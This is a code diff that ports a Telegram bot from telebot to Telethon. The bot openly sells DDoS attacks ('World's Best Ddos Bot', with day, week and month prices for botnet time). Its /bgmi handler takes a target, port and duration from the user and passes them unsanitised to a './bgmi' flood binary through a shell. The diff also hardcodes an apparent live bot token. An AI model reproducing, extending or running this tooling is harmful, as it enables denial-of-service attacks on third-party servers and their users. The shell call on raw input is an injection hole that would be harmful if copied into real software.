@@ -1,24 +1,17 @@
-import telebot
+from telethon import TelegramClient, events
 import subprocess
 import datetime
 import os
 
-os.system("chmod +x *")
+api_id = 1234567
+api_hash = 'abcdef1234567890abcdef1234567890'
+bot_token = '7850408397:AAEPMQjgYGJo7zg5r8CFP8QnwQ_LMPSjQko'
+client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
 
-# insert your Telegram bot token here
-bot = telebot.TeleBot('7850408397:AAEPMQjgYGJo7zg5r8CFP8QnwQ_LMPSjQko')
-
-# Admin user IDs
 admin_id = ["6927161305"]
-
-# File to store allowed user IDs
 USER_FILE = "users.txt"
-
-# File to store command logs
 LOG_FILE = "log.txt"
 
-
-# Function to read user IDs from the file
 def read_users():
     try:
         with open(USER_FILE, "r") as file:
@@ -26,35 +19,24 @@ def read_users():
     except FileNotFoundError:
         return []
 
-# List to store allowed user IDs
 allowed_user_ids = read_users()
 
-# Function to log command to the file
 def log_command(user_id, target, port, time):
-    user_info = bot.get_chat(user_id)
-    if user_info.username:
-        username = "@" + user_info.username
-    else:
-        username = f"UserID: {user_id}"
-    
-    with open(LOG_FILE, "a") as file:  # Open in "append" mode
+    username = f"UserID: {user_id}"
+    with open(LOG_FILE, "a") as file:
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
-
-# Function to clear logs
 def clear_logs():
     try:
         with open(LOG_FILE, "r+") as file:
             if file.read() == "":
-                response = "Logs are already cleared. No data found."
+                return "Logs are already cleared. No data found."
             else:
                 file.truncate(0)
-                response = "Logs cleared successfully"
+                return "Logs cleared successfully"
     except FileNotFoundError:
-        response = "No logs found to clear."
-    return response
+        return "No logs found to clear."
 
-# Function to record command logs
 def record_command_logs(user_id, command, target=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
     if target:
@@ -63,15 +45,14 @@ def record_command_logs(user_id, command, target=None, port=None, time=None):
         log_entry += f" | Port: {port}"
     if time:
         log_entry += f" | Time: {time}"
-    
     with open(LOG_FILE, "a") as file:
         file.write(log_entry + "\n")
 
-@bot.message_handler(commands=['add'])
-def add_user(message):
-    user_id = str(message.chat.id)
+@client.on(events.NewMessage(pattern='/add'))
+async def add_user(event):
+    user_id = str(event.sender_id)
     if user_id in admin_id:
-        command = message.text.split()
+        command = event.raw_text.split()
         if len(command) > 1:
             user_to_add = command[1]
             if user_to_add not in allowed_user_ids:
@@ -85,16 +66,13 @@ def add_user(message):
             response = "Please specify a user ID to add."
     else:
         response = "Only Admin Can Run This Command."
+    await event.respond(response)
 
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
-    user_id = str(message.chat.id)
+@client.on(events.NewMessage(pattern='/remove'))
+async def remove_user(event):
+    user_id = str(event.sender_id)
     if user_id in admin_id:
-        command = message.text.split()
+        command = event.raw_text.split()
         if len(command) > 1:
             user_to_remove = command[1]
             if user_to_remove in allowed_user_ids:
@@ -106,37 +84,23 @@ def remove_user(message):
             else:
                 response = f"User {user_to_remove} not found in the list."
         else:
-            response = '''Please Specify A User ID to Remove. 
- Usage: /remove <userid>'''
+            response = '''Please Specify A User ID to Remove. Usage: /remove <userid>'''
     else:
         response = "Only Admin Can Run This Command."
+    await event.respond(response)
 
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['clearlogs'])
-def clear_logs_command(message):
-    user_id = str(message.chat.id)
+@client.on(events.NewMessage(pattern='/clearlogs'))
+async def clear_logs_command(event):
+    user_id = str(event.sender_id)
     if user_id in admin_id:
-        try:
-            with open(LOG_FILE, "r+") as file:
-                log_content = file.read()
-                if log_content.strip() == "":
-                    response = "Logs are already cleared. No data found."
-                else:
-                    file.truncate(0)
-                    response = "Logs Cleared Successfully"
-        except FileNotFoundError:
-            response = "Logs are already cleared."
+        response = clear_logs()
     else:
         response = "Only Admin Can Run This Command."
-    bot.reply_to(message, response)
+    await event.respond(response)
 
- 
-
-@bot.message_handler(commands=['allusers'])
-def show_all_users(message):
-    user_id = str(message.chat.id)
+@client.on(events.NewMessage(pattern='/allusers'))
+async def show_all_users(event):
+    user_id = str(event.sender_id)
     if user_id in admin_id:
         try:
             with open(USER_FILE, "r") as file:
@@ -144,101 +108,72 @@ def show_all_users(message):
                 if user_ids:
                     response = "Authorized Users:\n"
                     for user_id in user_ids:
-                        try:
-                            user_info = bot.get_chat(int(user_id))
-                            username = user_info.username
-                            response += f"- @{username} (ID: {user_id})\n"
-                        except Exception as e:
-                            response += f"- User ID: {user_id}\n"
+                        response += f"- User ID: {user_id}\n"
                 else:
                     response = "No data found"
         except FileNotFoundError:
             response = "No data found"
     else:
         response = "Only Admin Can Run This Command."
-    bot.reply_to(message, response)
+    await event.respond(response)
 
-
-@bot.message_handler(commands=['logs'])
-def show_recent_logs(message):
-    user_id = str(message.chat.id)
+@client.on(events.NewMessage(pattern='/logs'))
+async def show_recent_logs(event):
+    user_id = str(event.sender_id)
     if user_id in admin_id:
         if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-            try:
-                with open(LOG_FILE, "rb") as file:
-                    bot.send_document(message.chat.id, file)
-            except FileNotFoundError:
-                response = "No data found."
-                bot.reply_to(message, response)
+            await event.respond(file=LOG_FILE)
         else:
             response = "No data found"
-            bot.reply_to(message, response)
+            await event.respond(response)
     else:
         response = "Only Admin Can Run This Command."
-        bot.reply_to(message, response)
+        await event.respond(response)
 
-
-@bot.message_handler(commands=['id'])
-def show_user_id(message):
-    user_id = str(message.chat.id)
+@client.on(events.NewMessage(pattern='/id'))
+async def show_user_id(event):
+    user_id = str(event.sender_id)
     response = f"Your ID: {user_id}"
-    bot.reply_to(message, response)
+    await event.respond(response)
 
-# Function to handle the reply when free users run the /bgmi command
-def start_attack_reply(message, target, port, time):
-    user_info = message.from_user
-    username = user_info.username if user_info.username else user_info.first_name
-    
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n"
-    bot.reply_to(message, response)
-
-# Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
+COOLDOWN_TIME = 0
 
-COOLDOWN_TIME =0
+@client.on(events.NewMessage(pattern='/bgmi'))
+async def handle_bgmi(event):
+    user_id = str(event.sender_id)
 
-# Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
-def handle_bgmi(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
+    if user_id in allowed_user_ids or user_id in admin_id:
         if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                 response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
-                bot.reply_to(message, response)
+                await event.respond(response)
                 return
-            # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
-        
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        command = event.raw_text.split()
+        if len(command) == 4:
             target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
-            if time > 181:
+            port = int(command[2])
+            time = int(command[3])
+            if user_id not in admin_id and time > 181:
                 response = "Error: Time interval must be less than 80."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\n"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\n"
     else:
-        response = "You Are Not Authorized To Use This Command.\n"
+        response = "You Are Not Authorized To Use This Command."
+    
+    await event.respond(response)
 
-    bot.reply_to(message, response)
 
-
-
-# Add /mylogs command to display logs recorded for bgmi and website commands
-@bot.message_handler(commands=['mylogs'])
-def show_command_logs(message):
-    user_id = str(message.chat.id)
+@client.on(events.NewMessage(pattern='/mylogs'))
+async def show_command_logs(event):
+    user_id = str(event.sender_id)
     if user_id in allowed_user_ids:
         try:
             with open(LOG_FILE, "r") as file:
@@ -252,107 +187,59 @@ def show_command_logs(message):
             response = "No command logs found."
     else:
         response = "You Are Not Authorized To Use This Command."
+    await event.respond(response)
 
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['help'])
-def show_help(message):
+@client.on(events.NewMessage(pattern='/help'))
+async def show_help(event):
     help_text = '''Available commands:
- /bgmi : Method For Bgmi Servers. 
+ /bgmi : Method For Bgmi Servers.
  /rules : Please Check Before Use !!.
  /mylogs : To Check Your Recents Attacks.
  /plan : Checkout Our Botnet Rates.
-
- To See Admin Commands:
- /admincmd : Shows All Admin Commands.
  
+To See Admin Commands:
+ /admincmd : Shows All Admin Commands.
 '''
-    for handler in bot.message_handlers:
-        if hasattr(handler, 'commands'):
-            if message.text.startswith('/help'):
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-            elif handler.doc and 'admin' in handler.doc.lower():
-                continue
-            else:
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-    bot.reply_to(message, help_text)
+    await event.respond(help_text)
 
-@bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
+@client.on(events.NewMessage(pattern='/start'))
+async def welcome_start(event):
+    user_name = event.sender.first_name
     response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\n"
-    bot.reply_to(message, response)
+    await event.respond(response)
 
+@client.on(events.NewMessage(pattern='/rules'))
+async def welcome_rules(event):
+    user_name = event.sender.first_name
+    response = f"{user_name} Please Follow These Rules:\n1. Dont Run Too Many Attacks!!\n2. Dont Run 2 Attacks At Same Time\n3. Follow these rules to avoid Ban!!"
+    await event.respond(response)
 
-@bot.message_handler(commands=['rules'])
-def welcome_rules(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules:
+@client.on(events.NewMessage(pattern='/plan'))
+async def welcome_plan(event):
+    user_name = event.sender.first_name
+    response = f"{user_name}, Only 1 Plan Is Powerful:\nVip : Attack Time : 200 (S)\nAfter Attack Limit : 2 Min\nConcurrents Attack : 300\nPrices:\nDay-->150 Rs\nWeek-->900 Rs\nMonth-->1600 Rs\n"
+    await event.respond(response)
 
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
-'''
-    bot.reply_to(message, response)
+@client.on(events.NewMessage(pattern='/admincmd'))
+async def admin_commands(event):
+    user_name = event.sender.first_name
+    response = f"{user_name}, Admin Commands:\n/add <userId> : Add a User.\n/remove <userid> : Remove a User.\n/allusers : Authorized Users Lists.\n/logs : All Users Logs.\n/broadcast : Broadcast a Message.\n/clearlogs : Clear Logs File.\n"
+    await event.respond(response)
 
-@bot.message_handler(commands=['plan'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
-
-Vip :
--> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
--> Concurrents Attack : 300
-
-Pr-ice List:
-Day-->150 Rs
-Week-->900 Rs
-Month-->1600 Rs
-
-'''
-    bot.reply_to(message, response)
-
-@bot.message_handler(commands=['admincmd'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
-
-/add <userId> : Add a User.
-/remove <userid> Remove a User.
-/allusers : Authorised Users Lists.
-/logs : All Users Logs.
-/broadcast : Broadcast a Message.
-/clearlogs : Clear The Logs File.
-
-'''
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['broadcast'])
-def broadcast_message(message):
-    user_id = str(message.chat.id)
+@client.on(events.NewMessage(pattern='/broadcast'))
+async def broadcast_message(event):
+    user_id = str(event.sender_id)
     if user_id in admin_id:
-        command = message.text.split(maxsplit=1)
-        if len(command) > 1:
-            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                for user_id in user_ids:
-                    try:
-                        bot.send_message(user_id, message_to_broadcast)
-                    except Exception as e:
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-            response = "Broadcast Message Sent Successfully To All Users."
+        message = event.raw_text.split(maxsplit=1)[1] if len(event.raw_text.split()) > 1 else ""
+        if message:
+            for user_id in allowed_user_ids:
+                await client.send_message(user_id, message)
+            response = "Message Broadcasted Successfully."
         else:
-            response = "Please Provide A Message To Broadcast."
+            response = "Please provide a message to broadcast."
     else:
         response = "Only Admin Can Run This Command."
+    await event.respond(response)
 
-    bot.reply_to(message, response)
-
-
-
-
-bot.polling()
+client.start()
+client.run_until_disconnected()
